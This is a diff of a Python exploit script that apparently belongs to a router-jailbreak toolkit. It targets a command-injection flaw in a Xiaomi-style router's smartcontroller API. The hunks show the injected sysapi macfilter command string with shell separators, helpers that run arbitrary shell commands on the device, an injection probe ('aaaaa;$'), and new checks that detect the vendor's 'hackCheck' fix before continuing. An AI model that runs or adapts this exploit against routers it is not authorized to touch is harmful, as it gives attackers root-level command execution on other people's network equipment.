@@ -17,11 +17,17 @@ import json
 import xmir_base
 from gateway import *
 
+die_if_sshOk = True
+web_password = True
+if len(sys.argv) > 1 and sys.argv[0].endswith('connect5.py'):
+    if sys.argv[1]:
+        web_password = sys.argv[1]
+        die_if_sshOk = False
 
 try:
     gw = inited_gw
 except NameError:
-    gw = create_gateway(die_if_sshOk = True)
+    gw = create_gateway(die_if_sshOk = die_if_sshOk, web_login = web_password)
 
 ccode = gw.device_info["countrycode"]
 
@@ -48,7 +54,7 @@ int32_t run_sysapi_macfilter(char* mac, int32_t wan_block)
 """
 vuln_cmd = "/usr/sbin/sysapi macfilter set mac=;; wan=no;/usr/sbin/sysapi macfilter commit"
 max_cmd_len = 100 - 1 - len(vuln_cmd)
-hackCheck = False
+hackCheck = gw.detect_hackCheck()
 
 def exec_smart_cmd(cmd, timeout = 7, api = 'API/xqsmarthome/request_smartcontroller'):
     ######
@@ -214,11 +220,13 @@ def exec_cmd(command, fn = '/tmp/e', run_as_sh = True):
         exec_tiny_cmd(f"sh {fn}")
 
 
+if hackCheck >= 3:
+    raise ExploitFixed(f'Exploits "Smartcontroller" are not usable (hackCheck:{hackCheck})')
+
 # Test smartcontroller interface
 res = get_all_scenes()
 
 # Detect using hackCheck fix
-hackCheck = False
 res = exec_smart_command("aaaaa;$", ignore_err_code = 2)
 if isinstance(res, dict):
     if res['msg'] != 'api not exists':
@@ -226,9 +234,9 @@ if isinstance(res, dict):
 else:
     if 'Internal Server Error' in res:
         print(f'Detect using xiaoqiang "hackCheck" fix ;-)')
-        hackCheck = True
+        #hackCheck = 1
     else:
-        raise ExploitNotWorked(f'Smartcontroller return error: {res}')
+        raise ExploitNotWorked(f'Smartcontroller return Error: {res}')
 
 # get device orig system time
 dst = gw.get_device_systime()
